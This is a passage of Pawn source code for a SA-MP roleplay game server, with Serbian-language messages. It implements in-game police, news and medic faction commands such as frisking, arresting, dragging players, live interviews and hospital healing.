    if( PlayerInfo[ playerid ][ xRank ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );

	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/suspend [ ID/Deo imena ] ");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID Korisnika" );
    if( PlayerInfo[ playerid ][ xRank ] < 6 && PlayerInfo[ id ][ xRank ] >= 5 ) return SendErrorMessage( playerid, "Ne mozes suspendovati rank 5+." );
    
    PlayerInfo[ id ][ xRank ] = 0;
    SavePlayer( id );
    
    SendInfoMessage( playerid, "Suspendovali ste igraca %s.", ImeIgraca( id ) );
    SendInfoMessage( playerid, "Da skines suspend igracu, samo mu daj rank 1+." );
    SendInfoMessage( id, "%s vas je suspendovao.", ImeIgraca( playerid ) );

    return 1;
}

CMD:gov( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xMute ] != 0 ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( PlayerInfo[ playerid ][ xRank ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( GetFactionType( playerid ) != ORG_TIP_PD && GetFactionType( playerid ) != ORG_TIP_MD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	new tekst[ 90 ], string[ 128 ];
	if( sscanf( params, "s[90]", tekst ) ) return SendUsageMessage( playerid, "/gov [ tekst ]");
	SendClientMessageToAll( -1, "{0049FF}|-----------------------------{C0C0C0}Najava iz Uprave{0049FF}-----------------------------|");
	format( string, sizeof( string ), "{0049FF}[%s] "col_white"%s %s: {0049FF}%s", OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], getOrgRank( playerid, PlayerInfo[ playerid ][ xClan ] ), ImeIgraca( playerid ), tekst );
	SendClientMessageToAll( -1, string );
	SendClientMessageToAll( -1, "{0049FF}|--------------------------------------------------------------------------------|");
	return true;
}

CMD:pdoprema( playerid, params[] ) {
	new id = PlayerInfo[ playerid ][ xClan ];
    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, OI[ id ][ oEquipPoint ][ 0 ], OI[ id ][ oEquipPoint ][ 1 ], OI[ id ][ oEquipPoint ][ 2 ] ) ) return SendErrorMessage( playerid, "Nisi kod Armory-ja.");
	SPD( playerid, dialog_OPREMA, DSL, D_NASLOV,  "Patrolska oprema\nStandardna oprema\nSpecijalna oprema\nProfesionalna oprema\nSnajperska oprema\nPancir\nHealth\nRiot Shield\nSWAT uniforma\nLisice\nTazer metkovi\nKamera", D_ODABERI, D_ODUSTANI );
	return true;
}

CMD:removearm( playerid, params[] ) {
	if( IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_LHAND) && RiotShield[ playerid ] == true ) {
        RiotShield[ playerid ] = false;
        RemovePlayerAttachedObject( playerid, OBJECT_SLOT_LHAND );
        format( globalstring, sizeof( globalstring ), "* %s odbacuje Riot Shield.", ImeIgraca( playerid ) );
		PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
	}
	else SCM(playerid, CRVENA, "Nemas Riot Shield u ruci!");
	return true;
}

alias:frisk("pretresi");
CMD:frisk( playerid, params[] ) {
    new igrac, weapon[13], bullets[13];
    if( GetFactionType( playerid )  != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
    if( sscanf(params, "u", igrac ) ) return SCM( playerid, BELA, "BELA: /frisk [ ID/Deo imena ]");
	if( IsPlayerConnected( igrac ) ) {
		if( igrac != INVALID_PLAYER_ID ) {
		    if( IsPlayerNearPlayer( 5.0, playerid, igrac ) && !IsPlayerInAnyVehicle( playerid ) && !IsPlayerInAnyVehicle( igrac ) ) {
			    if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes pretrest sam sebe!");
			    format( globalstring, sizeof( globalstring ), "[_________________________ %s DROGE _________________________=]", ImeIgraca( igrac ) );
                SCM( playerid, SVETLOPLAVA, globalstring);
		        format( globalstring, sizeof( globalstring ), "Slot 1: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ igrac ][ xDrugCode ][ 0 ] ), PlayerInfo[ igrac ][ xDrug ][ 0 ] );
				SCM( playerid, BELA, globalstring);
				format( globalstring, sizeof( globalstring ), "Slot 2: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ igrac ][ xDrugCode ][ 1 ] ), PlayerInfo[ igrac ][ xDrug ][ 1 ] );
				SCM( playerid, BELA, globalstring);
				format( globalstring, sizeof( globalstring ), "Slot 3: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ igrac ][ xDrugCode ][ 2 ] ), PlayerInfo[ igrac ][ xDrug ][ 2 ] );
				SCM( playerid, BELA, globalstring);
				format( globalstring, sizeof( globalstring ), "Slot 4: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ igrac ][ xDrugCode ][ 3 ] ), PlayerInfo[ igrac ][ xDrug ][ 3 ] );
				SCM( playerid, BELA, globalstring);
				format( globalstring, sizeof( globalstring ), "Slot 5: [%s(%d g)]", GetDrugNameByDrugID( PlayerInfo[ igrac ][ xDrugCode ][ 4 ] ), PlayerInfo[ igrac ][ xDrug ][ 4 ] );
				SCM( playerid, BELA, globalstring);
				format( globalstring, sizeof( globalstring ), "* %s je pretrazio %s za ilegalne predmete.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
				PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
                format( globalstring, sizeof( globalstring ), "[_________________________ %s ORUZJE ________________________=]", ImeIgraca( igrac ) );
				SCM( playerid, SVETLOPLAVA, globalstring);
				for( new slot = 0; slot < 13; slot++ ) {
                    GetPlayerWeaponData( igrac, slot, weapon[ slot ], bullets[ slot ] );

					if( weapon[ slot ] > 0 && bullets[slot] > 0 ) {
	                    format( globalstring, sizeof( globalstring ), "ORUZJE: %s, METAKA: %d.", WeapNames[ weapon[ slot ] ], bullets[ slot ] );
					    SCM( playerid, BELA, globalstring);
					}
			    }
			} else SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
		}
	} else SendErrorMessage( playerid, "Taj igrac nije online !");
    return 1;
}

CMD:proveripojas( playerid, params[] ) {

	new ID;
	if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
	if( sscanf( params, "d", ID ) ) return SendUsageMessage( playerid, "/proveripojas [ ID/Deo imena ]");
	if( !IsPlayerConnected( ID ) ) return SendErrorMessage( playerid, "Nepravilni ID");
	if( !IsPlayerNearPlayer( 3.0, playerid, ID ) ) return SendErrorMessage( playerid, "Taj igrac nije pored vas.");
	if( !IsPlayerInAnyVehicle( ID ) ) return SendErrorMessage( playerid, "Igrac nije u vozilu.");
	if( Pojas[ ID ] == true ) return SCM( playerid, SVETLOPLAVA, "* Igrac je vezan." );
	else return SCM( playerid, SVETLOPLAVA, "* Igrac nije vezan." );
}

CMD:uhapsi( playerid, params[] ) {
	if( GetFactionType( playerid ) == ORG_TIP_PD ) {
	    new id;
		if( sscanf(params, "u", id ) ) return SendUsageMessage( playerid, "/uhapsi [ ID/Deo imena ]");
	    if( !IsPlayerInRangeOfPoint( playerid, 6.0, 1103.0874,-1359.4902,6.2786) && !IsPlayerInRangeOfPoint(playerid, 6.0, 1527.8656,-1480.8500,13.6331)) return SendErrorMessage( playerid, "Niste na mjestu za uhicenje igraca !");
        // if( !IsPlayerInRangeOfPoint( playerid, 6.0, 1103.0874,-1359.4902,6.2786)) return SendErrorMessage( playerid, "Niste na mjestu za uhicenje igraca !");
		if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
		if( IsPlayerConnected( id ) ) {
		    if( id != INVALID_PLAYER_ID ) {
		        if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete uhapsiti sami sebe!");
                if( OI[ PlayerInfo[ id ][ xClan ] ][ oTip ] == ORG_TIP_PD ) return SendErrorMessage( playerid, "Ne mozes uhapsiti policajca.");
				if( PlayerInfo[ id ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec u zatvoru." );
				if( !IsPlayerNearPlayer(5.0, playerid, id ) ) return SendErrorMessage( playerid, "Taj igrac nije dovoljno blizu vas !");
				if( PlayerInfo[ id ][ xWanted ] < 1 ) return SendErrorMessage( playerid, "Igrac mora imati barem 1 Wanted Level !");
				new time = PlayerInfo[ id ][ xWanted ]*6;
				new bailprice = PlayerInfo[ id ][ xWanted ]*5000;

				format( globalstring, sizeof( globalstring ), "* Uhitili ste %s !", ImeIgraca( id ) );
				SCM( playerid, SVETLOCRVENA, globalstring );
	
                for( new i = 1; i < MAX_ORG; i++) {
		    		if( OI[ i ][ oTip ] == ORG_TIP_PD ) {
						format( globalstring, sizeof( globalstring ), "< Policajac %s je uhitio osumljicenog %s. >", ImeIgraca( playerid ), ImeIgraca( id ) );
                		OrgPoruka( i, SVETLOCRVENA, globalstring);
					}
				}
				format( globalstring, sizeof( globalstring ), "Uhitio vas je %s", ImeIgraca( playerid ));
				GameTextForPlayer( id, globalstring, 5000, 5);
				ResetAllWeapons( id );
    			PlayerInfo[ id ][ xZatvor ] = OBICAN_ZATVOR;
   			 	PlayerInfo[ id ][ xZatvorVreme ] = time;

				PlayerInfo[ id ][ xBailPrice ] = bailprice;
				SendClientMessageEx( id, SVETLOPLAVA, "Pritvoreni ste na %d minuta. Kaucija: $%d", PlayerInfo[ id ][ xZatvorVreme ], PlayerInfo[ id ][ xBailPrice ] );
                SCM( id, SVETLOPLAVA, "Da platite kauciju koristite /platikauciju." );
                
				DajIgracuNovac( playerid, 2000 );
				DragedPlayerID[ playerid ] = -1;
				Draged[ id ] = -1;
				PlayerInfo[ id ][ xUhapsen ] += 1;
				PlayerInfo[ playerid ][ xPDUhapsio ] += 1;
				ClearAnimations( id );
				if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_RHAND ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_RHAND );
				SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );
				PlayerCuffed[ id ] = 0;

				new rand = random(sizeof(RandomZatvor));
				Novi_SetPlayerPos( id, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
                SetPlayerWorldBounds(id, -1398.697143, -1472.672607, -1443.334228, -1605.534057);
				PlayerInfo[ id ][ xWanted ] = 0;
				Novi_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
				strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
                GameTextForPlayer( id, "Ucitavanje ...", 1000, 4 );
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", id );
			    SetCameraBehindPlayer( id ); SetPlayerInterior( id, 0);
			    SetPlayerVirtualWorld( id, 0);
		        TogglePlayerControllable( id, 0 );
				SavePlayer( id );
		
				format( globalstring, sizeof( globalstring ), "[CNN] Vesti | "col_white"%s je upravo uhapsen od strane %s clana!", ImeIgraca( id ), OI[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ] );
				OOCNews( 0xFFA500AA, globalstring );
				
				format( globalstring, sizeof( globalstring ), "ARREST | %s je uhapsio igraca %s | Vreme: %dm", ImeIgraca( playerid ), ImeIgraca( id ), time );
				AdminPoruka( NARACRVENA, globalstring );


				return 1;
			}
		}
	} else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	return 1;
}

CMD:live(playerid, params[] ) {
	if( !IsPlayerInRangeOfPoint( playerid, 2.0, 216.9834,1163.6896,459.2804 ) ) return SendErrorMessage( playerid, "Niste na mestu za koriscenje /live!");
	if( GetFactionType( playerid )   != ORG_TIP_CNN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( PlayerInfo[ playerid ][ xRank ] < 3 ) return SendErrorMessage( playerid, "Morate biti rank 3 da biste koristili /live!");
	if( GetPVarInt( playerid, "TalkingLive" ) != 255 ) {
	    SCM( playerid, 0x33CCFFAA, "* Razgovor uzivo zavrsio." );
	    SCM( GetPVarInt( playerid, "TalkingLive"), 0x33CCFFAA, "* Razgovor uzivo zavrsio." );
	    TogglePlayerControllable( playerid, true );
	    TogglePlayerControllable( GetPVarInt( playerid, "TalkingLive"), 1 );
        SetPVarInt( GetPVarInt( playerid, "TalkingLive" ), "TalkingLive", 255 );
		SetPVarInt( playerid, "TalkingLive", 255 );
		return 1;
	}
	new id;
	if( sscanf( params, "u", id ) ) {
		SendUsageMessage( playerid, "/live [ ID/Deo imena ]");
	    return 1;
	}
	if( id == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi /live!");
    if( !IsPlayerNearPlayer( 3.0, playerid, id ) ) return SendErrorMessage( playerid, "Taj igrac nije blizu vas !");
	SendClientMessageEx( playerid, 0x33CCFFAA, "* Ponudili ste %s razgovor uzivo.", ImeIgraca( id ) );
	SendClientMessageEx( id, 0x33CCFFAA, "* %s vam je ponudio razgovor uzivo, ukucajte /prihvati live ako zelite prihvatit.", ImeIgraca( playerid ) );
	SetPVarInt( id, "LiveOffer", playerid );
	return 1;
}

// CMD:vesti( playerid, params[] ) {

// 	new text[ 128 ], string[ 234 ];
// 	if( GetFactionType( playerid ) != ORG_TIP_CNN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
//     if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
// 	new vehicleid = GetPlayerVehicleID( playerid );
// 	if( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO && OrgaVozila[ vehicleid ] == PlayerInfo[ playerid ][ xClan ] ) {
// 	    if( !newsbre ) {
// 			SendErrorMessage( playerid, "Mora proci %d sekundi izmedju slanja novosti !",  ( newstimer/1000 ) );
// 		    return 1;
// 		}
// 		if( sscanf( params, "s[128]", text ) ) return SendUsageMessage( playerid, "/vesti [Text]");
// 	    if( strfind( text, "~", true ) != -1 ) {
// 			SendErrorMessage( playerid, "Nedopusten znak u novostima (~)!");
// 			return 1;
// 		}
// 		SetTimer( "NewsOn", newstimer, 0 );
// 		newsbre = 0;
// 		PlayerInfo[ playerid ][ xBrojNews ]++;
// 		format( string, sizeof( string ), "[CNN] Vesti | %s: "col_white"%s", ImeIgraca( playerid ), text );
// 	    OOCNews( 0xFFA500AA, string );
// 	} else SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti u vozilu novinara" );
// 	return 1;
// }

CMD:newsstats( playerid, params[] ) {
	if( GetFactionType( playerid )   != ORG_TIP_CNN ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    SendClientMessage( playerid, 0x33CCFFAA, "__________CNN STATS_________");
	SendClientMessageEx( playerid, BELA, "Broj objavljenih newsa: [%d]", PlayerInfo[ playerid ][ xBrojNews ] );
	SendClientMessage( playerid, 0x33CCFFAA, "____________________________");
	return 1;
}

CMD:mduty( playerid, params[] ) {
	if( GetFactionType( playerid )  != ORG_TIP_MD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, -2287.8516, 88.6287, -5.3042 ) ) return SendErrorMessage( playerid, "Morate biti pored ormarica da bi koristili ovu komandu." );
    if( MedicDuty[ playerid ] == false ) {
		SCM( playerid, SVETLOPLAVA, "* Sada ste na duznosti doktora i primati cete pozive." );
	    MedicDuty[ playerid ] = true;
	    Medics += 1;
	}
	else if( MedicDuty[ playerid ] == true ) {
	    SCM( playerid, SVETLOPLAVA, "* Vise niste na duznosti doktora i necete primati vise pozive." );
      	MedicDuty[ playerid ] = false;
      	Medics -= 1;
	}
	return true;
}

CMD:muniform( playerid, params[] ) {
    if( GetFactionType( playerid )  != ORG_TIP_MD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( IsPlayerInRangeOfPoint( playerid, 2.0, -2287.8516, 88.6287, -5.3042 ) ) {
        SPD(playerid, dialog_MUNIFORM, DSL, D_NASLOV, "Skin 1\nSkin 2\nSkin 3\nSkin 4", D_ODABERI, D_ODUSTANI );
       	Novi_SetPlayerHealth( playerid, 150 );
	}
    return 1;
}

// CMD:medicine( playerid, params[] ) {
// 	new igrac, money, vehicleid = GetPlayerVehicleID( playerid );
// 	if( GetFactionType( playerid ) == ORG_TIP_MD ) {
// 		if( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO && OrgaVozila[ vehicleid ] == PlayerInfo[ playerid ][ xClan ] ) {
// 		    if( sscanf(params, "ui", igrac, money ) ) {
// 				SendUsageMessage( playerid, "/medicine [ ID/Deo Imena ] [ Cena ]");
// 		        return 1;
// 		    }
// 			if( money < 1 || money > 100 ) return SendErrorMessage( playerid, "Cena leka ne moze biti manja od 1 i veca od 100$!" );
//             if( PlayerInfo[ igrac ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Ne mozes leciti igraca manjeg levela od 3." );
// 			if( PlayerInfo[ igrac ][ xNovac ] < money ) return SendErrorMessage( playerid, "Samo probaj !");
// 			if( IsPlayerConnected( igrac ) ) {
//     			if( igrac != INVALID_PLAYER_ID ) {
//         			if( IsPlayerNearPlayer(5.0, playerid, igrac ) ) {
//                         if( igrac == playerid) return SendErrorMessage( playerid, "Ne mozete sami sebi prodati lek !");
//    						SendClientMessageEx( playerid, SVETLOPLAVA, "* Ponudili ste lek %s za $%d.", ImeIgraca( igrac ), money );
//    						SendClientMessageEx( igrac, SVETLOPLAVA, "* Doktor %s vam je ponudio lek za $%d. Upisite /prihvati medicine ako zelite uzeti lek da vam obnovi energiju.", ImeIgraca( playerid ), money );
// 					    SetPVarInt( igrac, "MedicineOffer", playerid );
// 					    SetPVarInt( igrac, "MedicineMoney", money );
//   					} else SendErrorMessage( playerid, "Taj igrac nije blizu vas!");
//  				}
// 			}
// 			return 1;
// 		}
// 		else SendErrorMessage( playerid, "Niste u autu hitne pomoci!");
// 	}
// 	return 1;
// }

CMD:lek( playerid, params[] ) {
	if( !IsPlayerInRangeOfPoint( playerid, 3.0, -2322.9973, 110.1389, -5.3942 ) ) return SendErrorMessage( playerid, "Morate biti u bolnici." );
	Novi_SetPlayerHealth( playerid, 150 );
	TogglePlayerControllable( playerid, true );
    PlayerInfo[ playerid ][ xUbijen ] = 0;
	SCM( playerid, SVETLOPLAVA, "* Izlecili smo vam sve rane, mozete nastaviti dalje!" );
	return 1;
}

CMD:izlecizavisnost( playerid, params[] ) {

	if( !IsPlayerInRangeOfPoint( playerid, 3.0, -2323.0134, 113.0339, -5.3942 ) ) return SendErrorMessage( playerid, "Morate biti u bolnici." );
	if( PlayerInfo[ playerid ][ xNovac ] < 25000 ) return SendErrorMessage( playerid, "Nemas dovoljno novca (25.000$)." );

	DajIgracuNovac( playerid, -25000 );
	
	PlayerInfo[ playerid ][ xHeroinAddict ] = false;
	PlayerInfo[ playerid ][ xHeroinUsed ] = 0;
	PlayerInfo[ playerid ][ xHeroinIndicator ] = 0;
	PlayerInfo[ playerid ][ xCokeCrackAddict ] = false;
	PlayerInfo[ playerid ][ xCokeCrackUsed ] = 0;
	PlayerInfo[ playerid ][ xCokeCrackIndicator ] = 0;
	PlayerInfo[ playerid ][ xMethAddict ] = false;
	PlayerInfo[ playerid ][ xMethIndicator ] = 0;
    PlayerInfo[ playerid ][ xMethUsed ] = 0;
    SavePlayer( playerid );

    TogglePlayerControllable( playerid, false );

	Novi_SetPlayerHealth( playerid, 80.0 );
    SetPlayerInterior( playerid, 1 );
	SetPlayerVirtualWorld( playerid, playerid );

	new rand = random( sizeof( SpawnBolnica ) );
	Novi_SetPlayerPos( playerid, SpawnBolnica[ rand ][ 0 ], SpawnBolnica[ rand ][ 1 ], SpawnBolnica[ rand ][ 2 ] );
	SetPlayerFacingAngle( playerid, 90.000 );

	ApplyAnimation( playerid, "BEACH", "bather", 4.0, 1, 0, 0, 0, 0 );
	GameTextForPlayer( playerid, "~n~~w~Bicete izleceni za ~r~180 ~w~sekundi", 4000, 4 );

    SetPlayerCameraPos(playerid, -2280.1226, 105.9459, -3.6012);
	SetPlayerCameraLookAt(playerid, -2279.2388, 105.4819, -3.9212);

    Odbrojavanje[ playerid ] = 180;
	VremeTDControl( playerid, true );

	BolnicaTimer[ playerid ] = SetTimerEx( "IzlecenOdZavisnosti", 180000, false, "i", playerid );

	return 1;
}

// CMD:dajinekciju( playerid, params[] ) {
// 	new vehicleid = GetPlayerVehicleID( playerid ), igrac;
// 	if( GetFactionType( playerid ) == ORG_TIP_MD ) {
// 		if( ( TipVozila[ vehicleid ] == ORGANIZACIJSKO_VOZILO && OrgaVozila[ vehicleid ] == PlayerInfo[ playerid ][ xClan ] ) || InAmbu[ playerid ] != -1 ) {
// 		    if( sscanf( params, "u", igrac ) ) {
// 				SendUsageMessage( playerid, "/dajinekciju [ ID/Deo imena ]");
// 		        return 1;
// 		    }
// 			if( IsPlayerConnected( igrac ) ) {
//     			if( igrac != INVALID_PLAYER_ID ) {
//         			if( IsPlayerNearPlayer( 4.0, playerid, igrac ) ) {
//                             if( igrac == playerid) return SendErrorMessage( playerid, "Ne mozete sami sebi dati injekciju !");
// 							SendClientMessageEx( playerid, SVETLOPLAVA, "* Dali ste %s injekciju protiv bolova,sada ce se ta osoba moci kretati i uci u bolnicu.", ImeIgraca( igrac ) );
// 							SendClientMessageEx( igrac, SVETLOPLAVA, "* Doktor %s vam je dao injekciju,sada cete moci uci u bolnicu i izlijeciti se do kraja(/lek)", ImeIgraca( playerid ) );
// 							TogglePlayerControllable( igrac, 1 );
// 							format( globalstring, sizeof( globalstring ), "* %s uzima injekciju i pika u ruku osobu %s.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
// 							PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
// 						    return 1;
//   					} else SendErrorMessage( playerid, "Taj igrac nije blizu vas!");
//  				}
// 			}
// 			return 1;
// 		} else SendErrorMessage( playerid, "Niste u autu hitne pomoci!");
// 	}
// 	return 1;
// }

CMD:recover( playerid, params[] ) {
	new moneys, igrac;
    if( GetFactionType( playerid ) == ORG_TIP_MD ) {
        if( sscanf( params, "ui", igrac, moneys ) ) {
			SendUsageMessage( playerid, "/recover [ ID/Deo Imena ] [ Cena ]");
	        return 1;
	    }
		if( moneys < 1 || moneys > 50 ) return SendErrorMessage( playerid, "Cena lecenja ne moze biti manja od 1 i veca od 50$!" );
	    if( IsPlayerConnected( igrac ) ) {
		    if( igrac != INVALID_PLAYER_ID ) {
		        if( IsPlayerNearPlayer( 3.0, playerid, igrac ) ) {
		            if( PlayerInfo[ igrac ][ xLevel ] < 3 ) return SendErrorMessage( playerid, "Ne mozes leciti igraca manjeg levela od 3." );
				    if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes ozdraviti sam sebe!");
                    if( PlayerInfo[ igrac ][ xNovac ] < moneys ) return SendErrorMessage( playerid, "Samo probaj !");
					SendClientMessageEx( playerid, SVETLOPLAVA, "* Ponudio si %s lecenje u cijeni od $%d", ImeIgraca( igrac ), moneys );
					SendClientMessageEx( igrac, SVETLOPLAVA, "* Doktor %s ti je ponudio lecenje u cijeni od $%d", ImeIgraca( playerid ), moneys );
					SCM( igrac, SVETLOPLAVA, "* Ukucaj /prihvati recover da prihvatis lecenje.");
					SetPVarInt( igrac, "RecoverOffer", playerid );
					SetPVarInt( igrac, "RecoverMoney", moneys );
				} else SendErrorMessage( playerid, "Taj igrac nije blizu tebe !");
		    }
		}
	} else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    return 1;
}

forward Vuci( playerid );
public Vuci( playerid ) {
	if( IsPlayerConnected( playerid ) ) {
		if( IsPlayerConnected( DragedPlayerID[ playerid ] ) ) {
	
			if( !IsPlayerInAnyVehicle( playerid ) && ( !IsPlayerInAnyVehicle( DragedPlayerID[ playerid ] ) || IsPlayerInAnyVehicle( DragedPlayerID[ playerid ] ) ) ) {

				new Float:Pos[ 3 ];
				GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				SetPlayerPos( DragedPlayerID[ playerid ], Pos[ 0 ],  Pos[ 1 ]+0.4, Pos[ 2 ]);
				SetPlayerInterior( DragedPlayerID[ playerid ], GetPlayerInterior( playerid ) );
				SetPlayerVirtualWorld( DragedPlayerID[ playerid ], GetPlayerVirtualWorld( playerid ) );
			}
			else if( IsPlayerInAnyVehicle( playerid ) && !IsPlayerInAnyVehicle( DragedPlayerID[ playerid ] ) ) {

				new vehicle = GetPlayerVehicleID(playerid);
				if( IsSeatAvailable( vehicle, 1 ) ) {
					PutPlayerInVehicle( DragedPlayerID[ playerid ], vehicle, 1 );
				}
				else if( IsSeatAvailable( vehicle, 2 ) ) {
					PutPlayerInVehicle( DragedPlayerID[ playerid ], vehicle, 2 );
				}
				else if( IsSeatAvailable( vehicle, 3 ) ) {
					PutPlayerInVehicle( DragedPlayerID[ playerid ], vehicle, 3 );
				}
			}
		}
		else {
			DragedPlayerID[ playerid ] = -1;
			SendInfoMessage( playerid, "Igrac kog ste vukli je napustio server.");
			Novi_KillTimer( DragTimer[ playerid ] );
		}
	}
    return 1;
}

CMD:pdslap( playerid, params[] ) {
	new igrac, Float:x, Float:y, Float:z;
    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( sscanf( params, "u", igrac ) ) {
		SendUsageMessage( playerid, "/pdslap [ ID/Deo Imena ]");
		return 1;
	}
	if( igrac != INVALID_PLAYER_ID ) {
		if( IsPlayerConnected( igrac ) ) {
			if( !IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Igrac mora biti u vozilu.");
			if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete vuci sami sebe." );
			if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {

			    format( globalstring, sizeof( globalstring ), "* %s vas je izbacio iz vozila.", ImeIgraca( playerid ) );
				SCM( igrac, SVETLOPLAVA, globalstring );
				format( globalstring, sizeof( globalstring ), "* Izbacili ste %s iz vozila.", ImeIgraca( igrac ) );
				SCM( playerid, SVETLOPLAVA, globalstring );
				format( globalstring, sizeof( globalstring ), "* %s je izbacio %s iz vozila.", ImeIgraca( playerid ) ,ImeIgraca( igrac ) );
				PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );

				GetPlayerPos( igrac, x, y, z );
	    		Novi_SetPlayerPos( igrac, x, y, z+5 );
	    		if( antiCheatCS[ igrac ][ TakeVehicle ] != INVALID_VEHICLE_ID ) {
		    		BusyVehicle[ antiCheatCS[ igrac ][ TakeVehicle ] ] = -1;
		    	}
			} else return SendErrorMessage( playerid, "Igrac nije pored vas." );
		}
	} else return SendErrorMessage( playerid, "Pogresan ID igraca." );
	return true;
}

CMD:vuci( playerid, params[] ) {
	new igrac;
    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( sscanf( params, "u", igrac ) ) {
		SendUsageMessage( playerid, "/vuci [ ID/Deo Imena ]");
		return 1;
	}
	if( igrac != INVALID_PLAYER_ID ) {
		if( IsPlayerConnected( igrac ) ) {
            if( DragedPlayerID[ playerid ] != -1 ) return SendErrorMessage( playerid, "Ne mozete vuci vise od jednog igraca u isto vreme");
			if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete vuci sami sebe." );
			if( PlayerCuffed[ igrac ] != 2 ) return SendErrorMessage( playerid, "Igracu prvo morate staviti lisice." );
			if( IsPlayerNearPlayer( 5.0, playerid, igrac ) ) {
			
			    format( globalstring, sizeof( globalstring ), "* %s vas vuce.", ImeIgraca( playerid ) );
				SCM( igrac, SVETLOPLAVA, globalstring );
				format( globalstring, sizeof( globalstring ), "* Vucete %s.", ImeIgraca( igrac ) );
				SCM( playerid, SVETLOPLAVA, globalstring );
				format( globalstring, sizeof( globalstring ), "* %s vuce %s.", ImeIgraca( playerid ) ,ImeIgraca( igrac ) );
				PorukaRadius( 30.0, playerid, globalstring, LJUBICASTA );
				DragedPlayerID[ playerid ] = igrac;
				Draged[ igrac ] = playerid;
				DragTimer[ playerid ] = SetTimerEx( "Vuci", 800, true, "i", playerid, 1 );
			} else return SendErrorMessage( playerid, "Igrac nije pored vas." );
		}
	} else return SendErrorMessage( playerid, "Pogresan ID igraca." );
	return true;
}

CMD:pusti( playerid, params[] ) {
	new igrac;
    if( GetFactionType( playerid ) != ORG_TIP_PD ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
	if( sscanf( params, "u", igrac ) ) {
		SendUsageMessage( playerid, "/pusti [ ID/Deo Imena ]");
		return 1;
	}
	if( igrac != INVALID_PLAYER_ID ) {
		if( IsPlayerConnected( igrac ) ) {
